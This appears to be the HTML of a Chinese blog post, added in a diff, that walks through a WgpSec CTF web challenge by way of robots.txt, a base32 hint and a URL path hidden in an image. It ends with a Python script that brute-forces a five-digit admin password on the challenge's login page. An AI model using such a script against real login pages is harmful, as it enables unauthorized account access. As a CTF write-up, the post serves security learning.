@@ -1,0 +1,317 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.4" theme-name="Stellar" theme-version="1.26.4">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>WgpSec CTF(web:尝试找到你的小姐姐吧) - lazychild's Blog</title>
+
+  
+    <meta name="description" content="作者的啰嗦这是作者第一次更新有关ctf题目的文章，那么什么是CTF比赛呢？CTF是一种流行的信息安全竞赛形式，其英文名可直译为”夺得Flag”，也可意译为”夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”。具体的的一些细节，我就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WgpSec CTF(web:尝试找到你的小姐姐吧)">
+<meta property="og:url" content="https://www.lazychild.fun/2024/02/01/13/index.html">
+<meta property="og:site_name" content="lazychild&#39;s Blog">
+<meta property="og:description" content="作者的啰嗦这是作者第一次更新有关ctf题目的文章，那么什么是CTF比赛呢？CTF是一种流行的信息安全竞赛形式，其英文名可直译为”夺得Flag”，也可意译为”夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”。具体的的一些细节，我就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/7.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/8.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/9.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/10.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/11.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/14.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/12.png">
+<meta property="og:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/13.png">
+<meta property="article:published_time" content="2024-02-01T10:09:18.181Z">
+<meta property="article:modified_time" content="2024-02-01T07:21:14.205Z">
+<meta property="article:author" content="小哲">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/7.png">
+  
+  
+  
+  <meta name="keywords" content="web">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.4">
+
+  
+
+  
+
+  
+  
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/tou.gif" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">爱敲代码的小哲</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" class="icon search-icon" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E8%80%85%E7%9A%84%E5%95%B0%E5%97%A6"><span class="toc-text">作者的啰嗦</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-text">题目的网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="toc-text">开始做题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B"><span class="toc-text">正式开始</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%88%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-text">什么都没有先查看一下源代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AA%E8%B7%AF%E5%BE%84%EF%BC%9A-readme-hahah-txt%EF%BC%8C%E8%AF%95%E7%9D%80%E8%AE%BF%E9%97%AE%E5%AE%83%EF%BC%9A"><span class="toc-text">发现一个路径：&#x2F;readme_hahah.txt，试着访问它：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9A%84%E4%BF%A1%E6%81%AF%E7%89%B9%E5%88%AB%E5%A4%9A%EF%BC%9A"><span class="toc-text">这里的信息特别多：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base32%E4%BD%8D%E8%A7%A3%E7%A0%81"><span class="toc-text">base32位解码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86Hint%E7%9A%84%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8Cbase32%E4%BD%8D%E8%A7%A3%E7%A0%81%EF%BC%88%E7%BD%91%E4%B8%8A%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%E5%8D%B3%E5%8F%AF%EF%BC%89%EF%BC%9A"><span class="toc-text">将Hint的内容进行base32位解码（网上在线解码即可）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA%E6%88%91%E4%BB%AC%E7%94%A8%E8%AE%B0%E4%BA%8B%E6%9C%AC%E6%89%93%E5%BC%80%E6%9C%80%E5%88%9D%E7%9A%84%E9%82%A3%E5%BC%A0%E7%85%A7%E7%89%87%EF%BC%8C%E9%82%A3%E6%88%91%E4%BB%AC%E5%85%88%E5%8F%B3%E9%94%AE%E5%9B%BE%E7%89%87%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD%E5%90%8E%E6%89%93%E5%BC%80%E3%80%82%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%EF%BC%9A"><span class="toc-text">提示我们用记事本打开最初的那张照片，那我们先右键图片进行下载后打开。可以找到：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E5%B0%B1%E6%98%AF%E7%99%BB%E5%BD%95%E7%BD%91%E5%9D%80%E8%A2%AB%E9%81%AE%E7%9B%96%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A-7b6ca699"><span class="toc-text">这就是登录网址被遮盖的一部分：&#x2F;7b6ca699</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E7%BD%91%E5%9D%80%EF%BC%9Ahttp-web-t-ctf-wgpsec-org-notjustweb-7b6ca699-login-html"><span class="toc-text">输入网址：http:&#x2F;&#x2F;web.t.ctf.wgpsec.org&#x2F;notjustweb&#x2F;7b6ca699&#x2F;login.html</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4"><span class="toc-text">脚本爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%BD%9C%E8%80%85%E7%9A%84%E6%96%B9%E6%B3%95%E6%98%AF%E7%94%A8Python%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%EF%BC%9A"><span class="toc-text">这里作者的方法是用Python进行爆破：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag%EF%BC%9A"><span class="toc-text">得到flag：</span></a></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/02/01/45/"><span class="title">主题推荐-stellar</span></a><a class="item title" href="/2024/02/01/44/"><span class="title">css中变量的使用</span></a><a class="item title" href="/2024/02/01/43/"><span class="title">在vscode中的使用sass插件</span></a><a class="item title" href="/2024/02/01/42/"><span class="title">js扩展API</span></a><a class="item title" href="/2024/02/01/41/"><span class="title">css属性mix-blend-mode介绍</span></a><a class="item title" href="/2024/02/01/40/"><span class="title">uni-app实现app自动检测更新</span></a><a class="item title" href="/2024/02/01/39/"><span class="title">vue(原生js)事件委托与参数同时使用</span></a><a class="item title" href="/2024/02/01/38/"><span class="title">探究css的滤镜效果</span></a><a class="item title" href="/2024/02/01/37/"><span class="title">主题推荐-anzhiyu</span></a><a class="item title" href="/2024/02/01/36/"><span class="title">maupassant的基本配置</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/ctf/">ctf</a></div>
+<div class="flex-row" id="post-meta"><span class="text created"><time datetime="2024-02-01T10:09:18.181Z">2024-02-01</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-01T07:21:14.205Z">2024-02-01</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>WgpSec CTF(web:尝试找到你的小姐姐吧)</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="作者的啰嗦"><a href="#作者的啰嗦" class="headerlink" title="作者的啰嗦"></a>作者的啰嗦</h2><p>这是作者第一次更新有关ctf题目的文章，那么什么是CTF比赛呢？<br>CTF是一种流行的信息安全竞赛形式，其英文名可直译为”夺得Flag”，也可意译为”夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”。<br>具体的的一些细节，我就不在这里说明了，如果您对CTF感兴趣的话，可以具体找找相关说明。</p>
+<h2 id="题目的网站"><a href="#题目的网站" class="headerlink" title="题目的网站"></a>题目的网站</h2><p>这里是WgpSec CTF官方网站<a target="_blank" rel="noopener" href="https://ctf.wgpsec.org/">https://ctf.wgpsec.org</a>，<br>然后找到web题目:尝试找到你的小姐姐吧</p>
+<h2 id="开始做题"><a href="#开始做题" class="headerlink" title="开始做题"></a>开始做题</h2><p>在正式开始之前，你需要了解如下：</p>
+<ol>
+<li>什么是robots协议</li>
+<li>电脑已经有了Python环境，并且下载了pip（我的解题思路会用到Python脚本）</li>
+</ol>
+<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><p>点进去后发现是这样的</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/7.png" alt="这是图片"></p>
+<h4 id="什么都没有先查看一下源代码："><a href="#什么都没有先查看一下源代码：" class="headerlink" title="什么都没有先查看一下源代码："></a>什么都没有先查看一下源代码：</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/8.png" alt="这是图片"></p>
+<p>他说百度收录不了，那肯定就是robots协议，什么是robots协议呢？<br>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br>试着访问&#x2F;robots.txt:</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/9.png" alt="这是图片"></p>
+<h4 id="发现一个路径：-readme-hahah-txt，试着访问它："><a href="#发现一个路径：-readme-hahah-txt，试着访问它：" class="headerlink" title="发现一个路径：&#x2F;readme_hahah.txt，试着访问它："></a>发现一个路径：&#x2F;readme_hahah.txt，试着访问它：</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/10.png" alt="这是图片"></p>
+<h4 id="这里的信息特别多："><a href="#这里的信息特别多：" class="headerlink" title="这里的信息特别多："></a>这里的信息特别多：</h4><ol>
+<li>首先用户名是admin</li>
+<li>密码是5位的数字</li>
+<li>网站的登录网址（被遮盖了一部分）</li>
+</ol>
+<h2 id="base32位解码"><a href="#base32位解码" class="headerlink" title="base32位解码"></a>base32位解码</h2><h4 id="将Hint的内容进行base32位解码（网上在线解码即可）："><a href="#将Hint的内容进行base32位解码（网上在线解码即可）：" class="headerlink" title="将Hint的内容进行base32位解码（网上在线解码即可）："></a>将Hint的内容进行base32位解码（网上在线解码即可）：</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/11.png" alt="这是图片"></p>
+<h4 id="提示我们用记事本打开最初的那张照片，那我们先右键图片进行下载后打开。可以找到："><a href="#提示我们用记事本打开最初的那张照片，那我们先右键图片进行下载后打开。可以找到：" class="headerlink" title="提示我们用记事本打开最初的那张照片，那我们先右键图片进行下载后打开。可以找到："></a>提示我们用记事本打开最初的那张照片，那我们先右键图片进行下载后打开。可以找到：</h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/14.png" alt="这是图片"></p>
+<h4 id="这就是登录网址被遮盖的一部分：-7b6ca699"><a href="#这就是登录网址被遮盖的一部分：-7b6ca699" class="headerlink" title="这就是登录网址被遮盖的一部分：&#x2F;7b6ca699"></a>这就是登录网址被遮盖的一部分：&#x2F;7b6ca699</h4><h4 id="输入网址：http-web-t-ctf-wgpsec-org-notjustweb-7b6ca699-login-html"><a href="#输入网址：http-web-t-ctf-wgpsec-org-notjustweb-7b6ca699-login-html" class="headerlink" title="输入网址：http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.html"></a>输入网址：<a target="_blank" rel="noopener" href="http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.html">http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.html</a></h4><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/12.png" alt="这是图片"></p>
+<h2 id="脚本爆破"><a href="#脚本爆破" class="headerlink" title="脚本爆破"></a>脚本爆破</h2><h4 id="这里作者的方法是用Python进行爆破："><a href="#这里作者的方法是用Python进行爆破：" class="headerlink" title="这里作者的方法是用Python进行爆破："></a>这里作者的方法是用Python进行爆破：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def num(x):</span><br><span class="line">    mmm = 6 - x</span><br><span class="line">    item1 = &#x27;&#x27;</span><br><span class="line">    ooo = range(1, mmm)</span><br><span class="line">    for it in ooo:</span><br><span class="line">        item1 += &#x27;0&#x27;</span><br><span class="line">    return item1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">url = &#x27;http://web.t.ctf.wgpsec.org/notjustweb/7b6ca699/login.php&#x27;</span><br><span class="line">data = &#123;&#x27;username&#x27;: &#x27;admin&#x27;, &#x27;password&#x27;: &#x27;00000&#x27;, &#x27;verifycode&#x27;: &#x27;&#x27;, &#x27;submit&#x27;: &#x27;&#x27;&#125;</span><br><span class="line">a = range(0, 10000)</span><br><span class="line">for item in a:</span><br><span class="line">    stritem = str(item)</span><br><span class="line">    newitem = num(len(stritem)) + stritem</span><br><span class="line">    data[&#x27;password&#x27;] = newitem</span><br><span class="line">    r = requests.post(url, data)</span><br><span class="line">    print(r.text + newitem)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="得到flag："><a href="#得到flag：" class="headerlink" title="得到flag："></a>得到flag：</h2><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="http://xiao-zhe-is-not-lazy.gitee.io/lazychild-img/13.png" alt="这是图片"></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/01/14/">依赖包与vue版本冲突问题</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/01/12/">基于hexo的搜索功能</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">小哲</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.4">Stellar 1.26.4</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg t="1705412886951" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8331" width="200" height="200"><path d="M638.72 970.666667h-256c-118.186667 0-198.272-25.002667-251.946667-78.72S52.053333 758.186667 52.053333 640V384c0-118.186667 25.002667-198.272 78.72-251.946667S264.533333 53.333333 382.72 53.333333h256c118.186667 0 198.272 25.002667 251.946667 78.72S969.386667 265.813333 969.386667 384v256c0 118.186667-25.002667 198.272-78.72 251.946667S756.906667 970.666667 638.72 970.666667z m-256-853.333334c-100.096 0-165.802667 19.2-206.72 59.946667S116.053333 283.904 116.053333 384v256c0 100.096 19.072 165.802667 59.946667 206.72S282.624 906.666667 382.72 906.666667h256c100.096 0 165.802667-19.072 206.72-59.946667S905.386667 740.096 905.386667 640V384c0-100.096-19.072-165.802667-59.946667-206.72S738.816 117.333333 638.72 117.333333z" p-id="8332"></path><path d="M638.72 970.666667a32 32 0 0 1-32-32V85.333333a32 32 0 0 1 32-32 32 32 0 0 1 32 32v853.333334a32 32 0 0 1-32 32zM340.053333 653.226667a31.914667 31.914667 0 0 1-22.613333-9.386667 32 32 0 0 1 0-45.269333L404.053333 512 317.44 425.386667a32 32 0 0 1 0-45.226667 32 32 0 0 1 45.226667 0l109.226666 109.226667a32 32 0 0 1 0 45.269333L362.666667 643.84a31.914667 31.914667 0 0 1-22.613334 9.386667z" p-id="8333"></path></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.4';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.4';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
